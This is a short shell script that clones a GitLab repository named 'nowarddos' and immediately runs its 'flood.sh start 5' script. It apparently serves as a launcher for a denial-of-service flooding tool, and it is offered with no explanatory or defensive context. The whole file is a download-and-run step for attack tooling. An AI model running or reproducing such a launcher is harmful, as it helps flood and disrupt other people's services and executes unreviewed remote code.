#!/bin/sh
main() {
    echo "Setup"
    git clone "https://gitlab.com/a_gonda/nowarddos.git" || exit 1
    cd "nowarddos"
    ./flood.sh start 5
}

main "${@}"
